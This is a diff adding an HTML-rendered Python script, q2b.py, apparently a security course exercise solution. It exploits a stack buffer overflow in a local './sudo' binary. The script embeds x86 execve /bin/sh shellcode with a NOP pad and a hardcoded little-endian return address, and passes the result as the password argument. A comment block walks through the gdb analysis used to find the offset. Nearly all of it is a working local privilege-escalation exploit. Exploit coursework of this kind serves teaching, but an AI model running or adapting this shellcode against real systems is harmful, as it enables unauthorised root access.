@@ -1,0 +1,61 @@
+<html>
+<head>
+<title>q2b.py</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<style type="text/css">
+.ln { color: #606366; font-weight: normal; font-style: normal; }
+.s0 { color: rgb(204,120,50); font-weight: bold; }
+.s1 { color: rgb(169,183,198); }
+.s2 { color: rgb(204,120,50); }
+.s3 { color: rgb(165,194,97); }
+.s4 { color: rgb(128,128,128); }
+.s5 { color: rgb(104,151,187); }
+</style>
+</head>
+<BODY BGCOLOR="#2b2b2b">
+<TABLE CELLSPACING=0 CELLPADDING=5 COLS=1 WIDTH="100%" BGCOLOR="#606060" >
+<TR><TD><CENTER>
+<FONT FACE="Arial, Helvetica" COLOR="#000000">
+q2b.py</FONT>
+</center></TD></TR></TABLE>
+<pre>
+<a name="l1"><span class="ln">1    </span></a><span class="s0">import </span><span class="s1">os</span><span class="s2">, </span><span class="s1">sys</span><span class="s2">, </span><span class="s1">subprocess 
+<a name="l2"><span class="ln">2    </span></a> 
+<a name="l3"><span class="ln">3    </span></a>PATH_TO_SUDO = </span><span class="s3">'./sudo'</span><span class="s1"> 
+<a name="l4"><span class="ln">4    </span></a> 
+<a name="l5"><span class="ln">5    </span></a> 
+<a name="l6"><span class="ln">6    </span></a></span><span class="s0">def </span><span class="s1">run_shell(): 
+<a name="l7"><span class="ln">7    </span></a>    </span><span class="s4"># the shell code itself - doesn't contain 0x00</span><span class="s1"> 
+<a name="l8"><span class="ln">8    </span></a>    assembler_password = </span><span class="s3">'</span><span class="s2">\xeb\x16</span><span class="s3">1</span><span class="s2">\xc0</span><span class="s3">1</span><span class="s2">\xc9</span><span class="s3">1</span><span class="s2">\xd2</span><span class="s3">[1</span><span class="s2">\xff\x89\xdf\x83\xc7\x07\x89\x0f</span><span class="s3">1</span><span class="s2">\xc0\xb0\x0b\xcd\x80\xe8\xe5\xff\xff\xff</span><span class="s3">/bin/sh@'</span><span class="s1"> 
+<a name="l9"><span class="ln">9    </span></a>    cmd = </span><span class="s3">&quot;pwd&quot;</span><span class="s4"># arbitrary, just used to follow the proper usage of the program</span><span class="s1"> 
+<a name="l10"><span class="ln">10   </span></a>    nop = </span><span class="s3">'</span><span class="s2">\x90</span><span class="s3">' </span><span class="s1">* (</span><span class="s5">67 </span><span class="s1">- len(assembler_password)) </span><span class="s4"># add NOPs complete to exactly 67 bytes long password</span><span class="s1"> 
+<a name="l11"><span class="ln">11   </span></a>    shell_code_address = </span><span class="s3">'</span><span class="s2">\x69\xe0\xff\xbf</span><span class="s3">' </span><span class="s4"># Add begining of shell code address on stack, notic little endian</span><span class="s1"> 
+<a name="l12"><span class="ln">12   </span></a>    password = assembler_password + nop + shell_code_address 
+<a name="l13"><span class="ln">13   </span></a>    </span><span class="s3">''' 
+<a name="l14"><span class="ln">14   </span></a>    using core analysis with gdb: 
+<a name="l15"><span class="ln">15   </span></a>    segmentation fault occurred at address 0x0804007a, which is exactly the value of EIP register 
+<a name="l16"><span class="ln">16   </span></a>    analyzing further we see that the address (on stack) that contains this value is 0xbfffe0ac 
+<a name="l17"><span class="ln">17   </span></a>    so this is where RET value is stored on stack. 
+<a name="l18"><span class="ln">18   </span></a>    next, we see that our shell code (AAAAAAA...) starts exactly on address 0xbfffe069. 
+<a name="l19"><span class="ln">19   </span></a>    so this is where we would like to jump. 
+<a name="l20"><span class="ln">20   </span></a>    calculating, (altough already done in section a) the difference between the addresses is 67 bytes. 
+<a name="l21"><span class="ln">21   </span></a>    so our shell code has to be 67 bytes, then add the address in little endian. 
+<a name="l22"><span class="ln">22   </span></a>    so we will add NOPs to complete to exactly 67 bytes. 
+<a name="l23"><span class="ln">23   </span></a>    '''</span><span class="s1"> 
+<a name="l24"><span class="ln">24   </span></a>    subprocess.call([PATH_TO_SUDO</span><span class="s2">, </span><span class="s1">password</span><span class="s2">, </span><span class="s1">cmd]) 
+<a name="l25"><span class="ln">25   </span></a>    </span><span class="s0">return</span><span class="s1"> 
+<a name="l26"><span class="ln">26   </span></a> 
+<a name="l27"><span class="ln">27   </span></a> 
+<a name="l28"><span class="ln">28   </span></a></span><span class="s0">def </span><span class="s1">main(argv): 
+<a name="l29"><span class="ln">29   </span></a>    </span><span class="s0">if not </span><span class="s1">len(argv) == </span><span class="s5">1</span><span class="s1">: 
+<a name="l30"><span class="ln">30   </span></a>        </span><span class="s0">print </span><span class="s3">'Usage: %s' </span><span class="s1">% argv[</span><span class="s5">0</span><span class="s1">] 
+<a name="l31"><span class="ln">31   </span></a>        sys.exit(</span><span class="s5">1</span><span class="s1">) 
+<a name="l32"><span class="ln">32   </span></a> 
+<a name="l33"><span class="ln">33   </span></a>    run_shell() 
+<a name="l34"><span class="ln">34   </span></a> 
+<a name="l35"><span class="ln">35   </span></a> 
+<a name="l36"><span class="ln">36   </span></a></span><span class="s0">if </span><span class="s1">__name__ == </span><span class="s3">'__main__'</span><span class="s1">: 
+<a name="l37"><span class="ln">37   </span></a>    main(sys.argv) 
+<a name="l38"><span class="ln">38   </span></a></span></pre>
+</body>
+</html>
